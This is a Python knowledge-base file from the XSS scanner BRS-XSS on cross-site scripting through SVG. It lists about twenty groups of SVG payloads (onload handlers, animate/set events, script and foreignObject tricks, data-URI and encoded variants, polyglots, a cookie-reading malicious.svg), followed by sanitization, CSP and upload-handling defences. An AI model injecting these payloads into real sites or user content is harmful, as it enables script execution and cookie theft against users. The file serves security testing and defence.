#!/usr/bin/env python3

"""
Project: BRS-XSS
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2025-10-10 17:31:53 UTC+3
Status: Created
Telegram: https://t.me/easyprotech

Knowledge Base: SVG Context
"""

DETAILS = {
    "title": "Cross-Site Scripting (XSS) in SVG Context",
    
    "description": """
SVG (Scalable Vector Graphics) files can contain embedded JavaScript and are increasingly used in 
modern web applications. SVG XSS is particularly dangerous because SVG can be embedded inline in HTML, 
loaded as external files, used in <img> tags, or uploaded by users. Many developers and sanitizers 
fail to properly handle SVG attack vectors, making this a high-risk vulnerability.

SVG is XML-based, which means it supports scripting, event handlers, and can include HTML through 
foreignObject. This makes SVG a but dangerous format for user-generated content.

SEVERITY: HIGH
Common in file upload functionality, profile pictures, and user-generated graphics.
""",

    "attack_vector": """
SVG XSS ATTACK VECTORS:

1. BASIC ONLOAD:
   <svg onload=alert(1)>
   <svg onload="alert(document.domain)">
   <svg/onload=alert`1`>

2. ANIMATE ELEMENT:
   <svg><animate onbegin=alert(1) attributeName=x dur=1s>
   <svg><animate onend=alert(1) attributeName=x dur=1s>
   <svg><animate onrepeat=alert(1) attributeName=x dur=1s>

3. SET ELEMENT:
   <svg><set onbegin=alert(1) attributeName=x to=0>
   <svg><set onend=alert(1) attributeName=x>

4. SCRIPT TAG IN SVG:
   <svg><script>alert(1)</script></svg>
   <svg><script>alert(document.cookie)</script></svg>
   <svg><script xlink:href="data:,alert(1)"></script></svg>
   <svg><script href="data:,alert(1)"></script></svg>

5. FOREIGNOBJECT WITH HTML:
   <svg><foreignObject><body onload=alert(1)></foreignObject></svg>
   <svg><foreignObject><img src=x onerror=alert(1)></foreignObject></svg>
   <svg><foreignObject><iframe src="javascript:alert(1)"></foreignObject></svg>

6. USE ELEMENT:
   <svg><use href="data:image/svg+xml,<svg id=x onload=alert(1)>"/></svg>
   <svg><use xlink:href="data:image/svg+xml;base64,PHN2ZyBpZD0ieCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiBvbmxvYWQ9ImFsZXJ0KDEpIj48L3N2Zz4="/></svg>

7. IMAGE WITH XLINK:
   <svg><image xlink:href="javascript:alert(1)"></image></svg>
   <svg><image href="javascript:alert(1)"></image></svg>

8. A TAG IN SVG:
   <svg><a xlink:href="javascript:alert(1)"><text>Click</text></a></svg>
   <svg><a href="javascript:alert(1)"><text>Click</text></a></svg>

9. SVG IN DATA URI:
   <img src="data:image/svg+xml,<svg onload=alert(1)>">
   <img src="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+">
   <object data="data:image/svg+xml,<svg onload=alert(1)>">

10. SVG WITH MULTIPLE VECTORS:
    <svg><script>alert(1)</script><rect onload=alert(2)></svg>
    <svg onload=alert(1)><script>alert(2)</script></svg>

11. FILTER ELEMENT:
    <svg><filter id=x><feImage xlink:href="data:,alert(1)"></filter></svg>

12. PATTERN ELEMENT:
    <svg><pattern><image xlink:href="javascript:alert(1)"></pattern></svg>

13. MARKER ELEMENT:
    <svg><marker><image xlink:href="javascript:alert(1)"></marker></svg>

14. SVG POLYGLOTS (Works in multiple contexts):
    <svg/onload=alert(1)//
    "><svg onload=alert(1)>
    javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><svg onload=alert(1)>

15. CASE VARIATIONS:
    <sVg OnLoAd=alert(1)>
    <SVG ONLOAD=ALERT(1)>

16. ATTRIBUTE ENCODING:
    <svg onload=&#x61;&#x6c;&#x65;&#x72;&#x74;(1)>
    <svg onload="&#97;&#108;&#101;&#114;&#116;(1)">

17. EVENT HANDLERS:
    <svg onfocus=alert(1) autofocus>
    <svg onmouseover=alert(1)>
    <svg onclick=alert(1)>

18. NESTED SVG:
    <svg><svg onload=alert(1)></svg></svg>

19. SVG WITH STYLE:
    <svg><style>*{fill:url("javascript:alert(1)")}</style></svg>

20. UPLOADED SVG FILES:
    User uploads malicious.svg containing:
    <?xml version="1.0"?>
    <svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)">
      <script>alert(document.cookie)</script>
    </svg>
""",

    "remediation": """
DEFENSE STRATEGY:

1. SVG SANITIZATION:
   
   Use DOMPurify with SVG support:
   import DOMPurify from 'dompurify';
   
   const cleanSVG = DOMPurify.sanitize(dirtySVG, {
       USE_PROFILES: {svg: true, svgFilters: true},
       ADD_TAGS: ['use'],  // If needed
       FORBID_TAGS: ['script', 'foreignObject'],
       FORBID_ATTR: ['onload', 'onerror', 'onbegin', 'onend']
   });

2. SERVER-SIDE VALIDATION:
   
   Python example:
   import xml.etree.ElementTree as ET
   from defusedxml import ElementTree as DefusedET
   
   def sanitize_svg(svg_content):
       # Parse with defusedxml to prevent XXE
       tree = DefusedET.fromstring(svg_content)
       
       # Remove dangerous elements
       dangerous_tags = ['script', 'foreignObject', 'use']
       for tag in dangerous_tags:
           for elem in tree.findall(f'.//{tag}'):
               tree.remove(elem)
       
       # Remove event handlers
       for elem in tree.iter():
           attrs_to_remove = []
           for attr in elem.attrib:
               if attr.startswith('on'):
                   attrs_to_remove.append(attr)
           for attr in attrs_to_remove:
               del elem.attrib[attr]
       
       return ET.tostring(tree)

3. CONTENT-TYPE HEADERS:
   
   Always serve SVG with correct MIME type:
   Content-Type: image/svg+xml
   
   NEVER:
   Content-Type: text/html

4. CONTENT SECURITY POLICY:
   
   Restrict SVG execution:
   Content-Security-Policy: 
     default-src 'self';
     img-src 'self' data:;
     script-src 'self';

5. FILE UPLOAD PROTECTION:
   
   For user-uploaded SVG:
   a) Convert to raster format (PNG/JPEG) using ImageMagick/PIL:
      convert malicious.svg safe.png
   
   b) Or sanitize and re-render server-side
   
   c) Or serve with Content-Disposition: attachment:
      Content-Disposition: attachment; filename="file.svg"
      (Forces download instead of rendering)

6. WHITELIST SAFE ELEMENTS:
   
   Safe SVG elements:
   - svg, g, path, rect, circle, ellipse, line, polyline, polygon
   - text, tspan, textPath
   - defs, clipPath, mask
   - linearGradient, radialGradient, stop
   
   Dangerous elements to remove:
   - script
   - foreignObject
   - use (can load external content)
   - image (can have javascript: href)
   - a (can have javascript: href)
   - animate, set (with onbegin/onend)
   - feImage (in filters)

7. REMOVE EVENT HANDLERS:
   
   Remove all attributes starting with 'on':
   - onload, onerror, onclick, onmouseover
   - onbegin, onend, onrepeat
   - onfocus, onblur, etc.

8. VALIDATE HREF ATTRIBUTES:
   
   Check xlink:href and href:
   - Block javascript: protocol
   - Block data: URIs (unless whitelisted)
   - Only allow http:, https:, or # (same-document references)

9. USE SVG SANITIZATION LIBRARIES:
   
   JavaScript:
   - DOMPurify with SVG profile
   - svg-sanitizer
   
   Python:
   - bleach with SVG sanitizer
   - defusedxml (prevents XXE)
   
   PHP:
   - enshrined/svg-sanitize

10. ALTERNATIVE: CONVERT TO SAFE FORMAT:
    
    If SVG features not needed, convert to PNG:
    
    Python (using cairosvg):
    import cairosvg
    cairosvg.svg2png(url='input.svg', write_to='output.png')
    
    This completely removes any XSS risk

SECURITY CHECKLIST:

[ ] SVG sanitization implemented
[ ] DOMPurify or equivalent library used
[ ] Script tags stripped from SVG
[ ] Event handlers removed
[ ] foreignObject element blocked
[ ] use element with external href blocked
[ ] Correct Content-Type header set
[ ] CSP configured for SVG
[ ] File uploads: convert to raster or sanitize
[ ] xlink:href validated (no javascript:)
[ ] Content-Disposition: attachment for downloads
[ ] defusedxml used for parsing (prevents XXE)
[ ] Regular security testing of SVG handling

TESTING PAYLOADS:

Basic:
<svg onload=alert(1)>

Animate:
<svg><animate onbegin=alert(1) attributeName=x dur=1s>

Script:
<svg><script>alert(1)</script></svg>

ForeignObject:
<svg><foreignObject><body onload=alert(1)></foreignObject></svg>

Data URI:
data:image/svg+xml,<svg onload=alert(1)>

TOOLS:
- DOMPurify: https://github.com/cure53/DOMPurify
- svg-sanitizer: https://github.com/darylldoyle/svg-sanitizer
- defusedxml: https://github.com/tiran/defusedxml

REFERENCES:
- OWASP XSS Prevention Cheat Sheet
- SVG Security: https://www.w3.org/TR/SVG/security.html
- CWE-79: Cross-site Scripting
"""
}

